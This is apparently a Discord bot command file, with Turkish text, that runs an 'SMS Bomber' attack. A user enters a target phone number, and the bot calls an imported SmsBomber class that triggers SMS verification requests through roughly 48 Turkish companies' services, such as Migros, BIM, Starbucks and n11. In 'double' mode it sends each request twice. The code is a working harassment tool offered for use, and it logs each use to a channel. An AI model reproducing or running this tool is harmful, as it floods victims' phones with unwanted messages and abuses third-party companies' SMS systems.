const { Client, CommandInteraction, MessageEmbed } = require("discord.js");
const { createDatabase } = require("whisky.db");
const db = new createDatabase();
const ms = require("parse-ms");

const { SmsBomber } = require("../../whiskylorean/sms.js");

module.exports = {
    name: "sms-bomber",
    description: "Hedef numaraya SMS Bomber saldırısı yapar.",
    options: [{ type: "INTEGER", name: "tel-no", description: "SMS Bomber saldırısı yapılacak telefon numarası", required: true }, { type: "STRING", name: "mod", description: "Gönderim modu", required: true, choices: [{ name: "Tekli Gönderim", value: "tekli"}, { name: "Çift Gönderim", value: "cift" }]}],
    type: 'CHAT_INPUT',
    /**
     *
     * @param {Client} client
     * @param {CommandInteraction} interaction
     * @param {String[]} args
     */
    run: async (client, interaction, args) => {

        const config = client.config;
        const regex = /^[1-9][0-9]{9}$/;
        let timeout = 60000;

        let tel = interaction.options.getInteger("tel-no");
        let gonderim = interaction.options.getString("mod");
        
        if (!interaction.member.roles.cache.has(config.gerekliRolId)) return interaction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription("Bu komutu kullanmak için gerekli role sahip değilsin!").setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("RED")], ephemeral: true });

        let beklelan = db.get(`smscool_${interaction.user.id}`);

        if (beklelan !== null && timeout - (Date.now() - beklelan) > 0) return interaction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`Bu komutu tekrar kullanmak için **${ms(timeout - (Date.now() - beklelan)).seconds}** saniye bekle!`).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("RED")], ephemeral: true });
        
        if (!regex.test(tel)) return interaction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription("Geçerli bir telefon numarası gir! Örnek: 5555555555").setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("RED")], ephemeral: true });
        
        await interaction.reply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başladı! \n:telephone: Hedef Numara: ||**${tel}**|| \n🎯 Gönderim Modu: ${gonderim.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")}`).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });

        const sms = new SmsBomber(tel, interaction, gonderim);

        if (client.config.log) {
            client.channels.cache.get(client.config.logKanalId).send(`<@${interaction.user.id}> - **${interaction.user.username}** - **${interaction.user.id}** SMS Bomber komutunu kullandı. Numara: **||${tel}||** Gönderim Modu: **${gonderim.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")}**`);
        }

        db.set(`smscool_${interaction.user.id}`, Date.now());

        if (gonderim == "tekli") {
            sms.kahveDunyasi();
            sms.wmf();
            sms.bim();
            sms.englishHome();
            sms.icq();
            sms.suIste();
            sms.kimGb();
            sms.tazi();
            sms.hey();
            sms.biSu();
            sms.ucDortBes();
            sms.macro();
            sms.tiklaGelsin();
            sms.altinYildiz();
            sms.naosStars();
            sms.isteGelsin();
            sms.hayatSu();
            sms.evIdea();
            sms.koton();
            sms.hizliEcza();
            sms.metro();
            sms.qumpara();
            sms.ipragaz();
            sms.migros();
            sms.paybol();
            sms.fileMarket();
            sms.joker();
            sms.akasya();
            sms.akbati();
            sms.clickMe();
            sms.happy();
            sms.komagene();
            sms.kuryemGelsin();
            sms.porty();
            sms.taksim();
            sms.tasdelen();
            sms.tasimacim();
            sms.uysal();
            sms.yapp();
            sms.yilmazTicaret();
            sms.yuffi();
            sms.starbucks();
            sms.pidem();
            sms.baydoner();
            sms.frink();
            sms.bodrum();
            sms.hoplaGit();
            sms.n11();
        } else if (gonderim == "cift") {
            for (i = 0; i < 2; i++) {
                sms.kahveDunyasi();
                sms.wmf();
                sms.bim();
                sms.englishHome();
                sms.icq();
                sms.suIste();
                sms.kimGb();
                sms.tazi();
                sms.hey();
                sms.biSu();
                sms.ucDortBes();
                sms.macro();
                sms.tiklaGelsin();
                sms.altinYildiz();
                sms.naosStars();
                sms.isteGelsin();
                sms.hayatSu();
                sms.evIdea();
                sms.koton();
                sms.hizliEcza();
                sms.metro();
                sms.qumpara();
                sms.ipragaz();
                sms.migros();
                sms.paybol();
                sms.fileMarket();
                sms.joker();
                sms.akasya();
                sms.akbati();
                sms.clickMe();
                sms.happy();
                sms.komagene();
                sms.kuryemGelsin();
                sms.porty();
                sms.taksim();
                sms.tasdelen();
                sms.tasimacim();
                sms.uysal();
                sms.yapp();
                sms.yilmazTicaret();
                sms.yuffi();
                sms.starbucks();
                sms.pidem();
                sms.baydoner();
                sms.frink();
                sms.bodrum();
                sms.hoplaGit();
                sms.n11();
            }
        }
    },
};

// developed by youtube.com/@djsturkiye // Whisky Lorean